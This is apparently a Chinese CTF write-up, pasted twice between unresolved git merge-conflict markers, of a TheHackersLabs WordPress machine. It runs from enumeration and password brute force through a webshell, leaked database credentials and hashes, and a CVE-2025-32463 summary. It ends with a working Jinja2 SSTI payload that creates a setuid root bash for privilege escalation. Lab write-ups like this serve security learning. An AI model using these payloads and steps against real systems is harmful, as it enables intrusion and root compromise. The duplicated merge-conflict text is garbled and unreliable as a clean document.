<<<<<<< HEAD
---
title: "濮阳夜话：TheFirstAvenger-WP"
date: 2025-07-22
categories: [learn,wp,随笔]
tags: [learn,thehackerlabs_wp]
---
## TheFirstAvenger-WP

最近打了10个左右thehackerlabs的easy靶场，好多wordpress的靶场。这个（TheFirstAvenger）也是，但与其他靶场提权的方式不同，其他大多是sudo -l有nopasswd能提权。

#### 信息收集

```shell
kali@kali:~$ sudo nmap -sT -p- 192.168.200.163 
[sudo] password for kali:                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:36 EDT          
Nmap scan report for 192.168.200.163 (192.168.200.163)                  
Host is up (0.0011s latency).                 
Not shown: 65533 closed tcp ports (conn-refused)                           
PORT   STATE SERVICE                              
22/tcp open  ssh                                
80/tcp open  http              
MAC Address: 00:0C:29:23:05:B0 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 10.09 seconds                                                                              
kali@kali:~$ sudo nmap -sT -sV -sC -p22,80 192.168.200.163 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:37 EDT   
Nmap scan report for 192.168.200.163 (192.168.200.163)                   
Host is up (0.00057s latency).           
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                       
|   256 a1:96:4a:cb:4a:c2:76:f6:35:61:64:53:31:53:a5:5e (ECDSA)
|_  256 63:00:29:0f:1b:2b:58:7c:aa:6c:28:78:bf:ce:6e:5e (ED25519)           
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))               
|_http-title: Bienvenido Cibervengador!                                
|_http-server-header: Apache/2.4.58 (Ubuntu)                          
MAC Address: 00:0C:29:23:05:B0 (VMware)                               
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                            
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds                                                                               
```

```shell
kali@kali:~$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://192.168.200.163 -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.200.163
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 474]
/server-status        (Status: 403) [Size: 280]
/wp1                  (Status: 301) [Size: 316] [--> http://192.168.200.163/wp1/]
/index.html           (Status: 200) [Size: 474]
Progress: 224648 / 224652 (100.00%)
===============================================================
Finished
===============================================================
kali@kali:~$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://192.168.200.163/wp1 -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.200.163/wp1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 327] [--> http://192.168.200.163/wp1/wp-content/]
/wp-admin             (Status: 301) [Size: 325] [--> http://192.168.200.163/wp1/wp-admin/]
/wp-includes          (Status: 301) [Size: 328] [--> http://192.168.200.163/wp1/wp-includes/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.200.163/wp1/]
/wp-trackback.php     (Status: 200) [Size: 136]
/readme.html          (Status: 200) [Size: 7409]
/license.txt          (Status: 200) [Size: 19915]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-login.php         (Status: 200) [Size: 6689]
/wp-config.php        (Status: 200) [Size: 0]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://thefirstavenger.thl/wp1/wp-login.php?action=register]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.200.163/wp1/]
Progress: 224648 / 224652 (100.00%)
===============================================================
Finished
===============================================================
```



WordPress 的 REST API 默认开启，访问 /wp-json/wp/v2/users 泄露用户名：admin。

直接爆破密码登录 WordPress 后台，尝试上传反弹 shell 压缩包到插件，但未成功反弹。改为下载文件管理插件，上传后成功获得 shell。

#### 立足点

```shell
www-data@TheHackersLabs-Thefirstavenger:/var/www/html/wp1$ cat wp-config.php
/** The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );
```

连数据库，系统有steve用户，破解密码，ssh。

```shell
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| top_secret         |
| wordpress          |
+--------------------+
4 rows in set (0.01 sec)

mysql> use top_secret
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed

mysql> show tables;
+----------------------+
| Tables_in_top_secret |
+----------------------+
| avengers             |
+----------------------+
1 row in set (0.00 sec)

mysql> select * from avengers;
+----+--------------+------------+----------------------------------+
| id | name         | username   | password                         |
+----+--------------+------------+----------------------------------+
|  1 | Iron Man     | ironman    | cc20f43c8c24dbc0b2539489b113277a |
|  2 | Thor         | thor       | 077b2e2a02ddb89d4d25dd3b37255939 |
|  3 | Hulk         | hulk       | ae2498aaff4ba7890d54ab5c91e3ea60 |
|  4 | Black Widow  | blackwidow | 022e549d06ec8ddecb5d510b048f131d |
|  5 | Hawkeye      | hawkeye    | d74727c034739e29ad1242b643426bc3 |
|  6 | Steve Rogers | steve      | 723a44782520fcdfb57daa4eb2af4be5 |
+----+--------------+------------+----------------------------------+
6 rows in set (0.01 sec)
```

#### 提权尝试

本想试试CVE-2025-32463，这个最近曝的提权漏洞。靶场sudo版本也合适，条件也符合。但没gcc，没root权限也不能安装。

#### **漏洞概述**

- **CVE ID**：CVE-2025-32463
- **影响版本**：Sudo 1.9.14 至 1.9.17（包括所有修订版）
- **CVSS 评分**：9.3（严重）
- **漏洞类型**：本地权限提升
- **描述**：该漏洞源于 sudo 在 1.9.14 版本中引入的路径解析更改，当使用 --chroot（-R）选项时，sudo 在用户指定的 chroot 环境中解析路径（如 /etc/nsswitch.conf），而不是在实际的系统根目录中。这允许攻击者通过创建一个恶意 nsswitch.conf 文件，诱导 sudo 加载恶意的共享库（例如 libnss_woot1337.so.2），从而以 root 权限执行任意代码。
- **PoC（概念验证）**：Stratascale Cyber Research Unit 的 Rich Mirch 提供了 sudo-chwoot.sh 脚本，展示如何通过伪造的 nsswitch.conf 和恶意库获得 root shell。

靶场内还有靶场，只能本机访问，ssh隧道转发出来

```shell
root         703  0.0  1.0  38964 10200 ?        Ss   14:34   0:02 /usr/bin/python3 /opt/app/server.py
```

```shell
tcp   LISTEN 0      128                127.0.0.1:7092       0.0.0.0:*  
```

```shell
ssh -L 9090:127.0.0.1:7092 steve@192.168.200.163
```

访问web是个ping的服务，经典，试了试能不能拼些命令。都不行。

看wp得知是ssti，能执行命令

```shell
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash').read()") }}{% endif %}{% endfor %}
```

操作：

cp /bin/bash /tmp/rootbash

chmod +s /tmp/rootbash

/tmp/rootbash -p

-p 是 **bash 的一个参数**，它的含义是：

**--preserve-privileges**：保留 setuid 权限。

#### 成功提权

```shell
steve@TheHackersLabs-Thefirstavenger:/tmp$ ./rootbash -p                                                                                                              
rootbash-5.2# id                                                                                                                                                      
uid=1000(steve) gid=1000(steve) euid=0(root) egid=0(root) groups=0(root),1000(steve)  
```

今天依旧看户子，1点左右，和大卫带良子连麦，挺有意思，连着连着良子睡了，打起了呼噜。

=======
---
title: "濮阳夜话：TheFirstAvenger-WP"
date: 2025-07-22
categories: [learn,wp,随笔]
tags: [learn,thehackerlabs_wp]
---
## TheFirstAvenger-WP

最近打了10个左右thehackerlabs的easy靶场，好多wordpress的靶场。这个（TheFirstAvenger）也是，但与其他靶场提权的方式不同，其他大多是sudo -l有nopasswd能提权。

#### 信息收集

```shell
kali@kali:~$ sudo nmap -sT -p- 192.168.200.163 
[sudo] password for kali:                           
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:36 EDT          
Nmap scan report for 192.168.200.163 (192.168.200.163)                  
Host is up (0.0011s latency).                 
Not shown: 65533 closed tcp ports (conn-refused)                           
PORT   STATE SERVICE                              
22/tcp open  ssh                                
80/tcp open  http              
MAC Address: 00:0C:29:23:05:B0 (VMware) 

Nmap done: 1 IP address (1 host up) scanned in 10.09 seconds                                                                              
kali@kali:~$ sudo nmap -sT -sV -sC -p22,80 192.168.200.163 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-21 10:37 EDT   
Nmap scan report for 192.168.200.163 (192.168.200.163)                   
Host is up (0.00057s latency).           
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                                       
|   256 a1:96:4a:cb:4a:c2:76:f6:35:61:64:53:31:53:a5:5e (ECDSA)
|_  256 63:00:29:0f:1b:2b:58:7c:aa:6c:28:78:bf:ce:6e:5e (ED25519)           
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))               
|_http-title: Bienvenido Cibervengador!                                
|_http-server-header: Apache/2.4.58 (Ubuntu)                          
MAC Address: 00:0C:29:23:05:B0 (VMware)                               
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                            
Nmap done: 1 IP address (1 host up) scanned in 8.34 seconds                                                                               
```

```shell
kali@kali:~$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://192.168.200.163 -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.200.163
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 474]
/server-status        (Status: 403) [Size: 280]
/wp1                  (Status: 301) [Size: 316] [--> http://192.168.200.163/wp1/]
/index.html           (Status: 200) [Size: 474]
Progress: 224648 / 224652 (100.00%)
===============================================================
Finished
===============================================================
kali@kali:~$ gobuster dir -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://192.168.200.163/wp1 -x php,txt,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.200.163/wp1
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/wp-content           (Status: 301) [Size: 327] [--> http://192.168.200.163/wp1/wp-content/]
/wp-admin             (Status: 301) [Size: 325] [--> http://192.168.200.163/wp1/wp-admin/]
/wp-includes          (Status: 301) [Size: 328] [--> http://192.168.200.163/wp1/wp-includes/]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.200.163/wp1/]
/wp-trackback.php     (Status: 200) [Size: 136]
/readme.html          (Status: 200) [Size: 7409]
/license.txt          (Status: 200) [Size: 19915]
/xmlrpc.php           (Status: 405) [Size: 42]
/wp-login.php         (Status: 200) [Size: 6689]
/wp-config.php        (Status: 200) [Size: 0]
/wp-signup.php        (Status: 302) [Size: 0] [--> http://thefirstavenger.thl/wp1/wp-login.php?action=register]
/index.php            (Status: 301) [Size: 0] [--> http://192.168.200.163/wp1/]
Progress: 224648 / 224652 (100.00%)
===============================================================
Finished
===============================================================
```



WordPress 的 REST API 默认开启，访问 /wp-json/wp/v2/users 泄露用户名：admin。

直接爆破密码登录 WordPress 后台，尝试上传反弹 shell 压缩包到插件，但未成功反弹。改为下载文件管理插件，上传后成功获得 shell。

#### 立足点

```shell
www-data@TheHackersLabs-Thefirstavenger:/var/www/html/wp1$ cat wp-config.php
/** The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the website, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://developer.wordpress.org/advanced-administration/wordpress/wp-config/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wordpress' );

/** Database password */
define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );
```

连数据库，系统有steve用户，破解密码，ssh。

```shell
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| performance_schema |
| top_secret         |
| wordpress          |
+--------------------+
4 rows in set (0.01 sec)

mysql> use top_secret
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A
Database changed

mysql> show tables;
+----------------------+
| Tables_in_top_secret |
+----------------------+
| avengers             |
+----------------------+
1 row in set (0.00 sec)

mysql> select * from avengers;
+----+--------------+------------+----------------------------------+
| id | name         | username   | password                         |
+----+--------------+------------+----------------------------------+
|  1 | Iron Man     | ironman    | cc20f43c8c24dbc0b2539489b113277a |
|  2 | Thor         | thor       | 077b2e2a02ddb89d4d25dd3b37255939 |
|  3 | Hulk         | hulk       | ae2498aaff4ba7890d54ab5c91e3ea60 |
|  4 | Black Widow  | blackwidow | 022e549d06ec8ddecb5d510b048f131d |
|  5 | Hawkeye      | hawkeye    | d74727c034739e29ad1242b643426bc3 |
|  6 | Steve Rogers | steve      | 723a44782520fcdfb57daa4eb2af4be5 |
+----+--------------+------------+----------------------------------+
6 rows in set (0.01 sec)
```

#### 提权尝试

本想试试CVE-2025-32463，这个最近曝的提权漏洞。靶场sudo版本也合适，条件也符合。但没gcc，没root权限也不能安装。

#### **漏洞概述**

- **CVE ID**：CVE-2025-32463
- **影响版本**：Sudo 1.9.14 至 1.9.17（包括所有修订版）
- **CVSS 评分**：9.3（严重）
- **漏洞类型**：本地权限提升
- **描述**：该漏洞源于 sudo 在 1.9.14 版本中引入的路径解析更改，当使用 --chroot（-R）选项时，sudo 在用户指定的 chroot 环境中解析路径（如 /etc/nsswitch.conf），而不是在实际的系统根目录中。这允许攻击者通过创建一个恶意 nsswitch.conf 文件，诱导 sudo 加载恶意的共享库（例如 libnss_woot1337.so.2），从而以 root 权限执行任意代码。
- **PoC（概念验证）**：Stratascale Cyber Research Unit 的 Rich Mirch 提供了 sudo-chwoot.sh 脚本，展示如何通过伪造的 nsswitch.conf 和恶意库获得 root shell。

靶场内还有靶场，只能本机访问，ssh隧道转发出来

```shell
root         703  0.0  1.0  38964 10200 ?        Ss   14:34   0:02 /usr/bin/python3 /opt/app/server.py
```

```shell
tcp   LISTEN 0      128                127.0.0.1:7092       0.0.0.0:*  
```

```shell
ssh -L 9090:127.0.0.1:7092 steve@192.168.200.163
```

访问web是个ping的服务，经典，试了试能不能拼些命令。都不行。

看wp得知是ssti，能执行命令

```shell
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash').read()") }}{% endif %}{% endfor %}
```

操作：

cp /bin/bash /tmp/rootbash

chmod +s /tmp/rootbash

/tmp/rootbash -p

-p 是 **bash 的一个参数**，它的含义是：

**--preserve-privileges**：保留 setuid 权限。

#### 成功提权

```shell
steve@TheHackersLabs-Thefirstavenger:/tmp$ ./rootbash -p                                                                                                              
rootbash-5.2# id                                                                                                                                                      
uid=1000(steve) gid=1000(steve) euid=0(root) egid=0(root) groups=0(root),1000(steve)  
```

今天依旧看户子，1点左右，和大卫带良子连麦，挺有意思，连着连着良子睡了，打起了呼噜。

>>>>>>> 1b610c84 (上传)
尊重他人命运。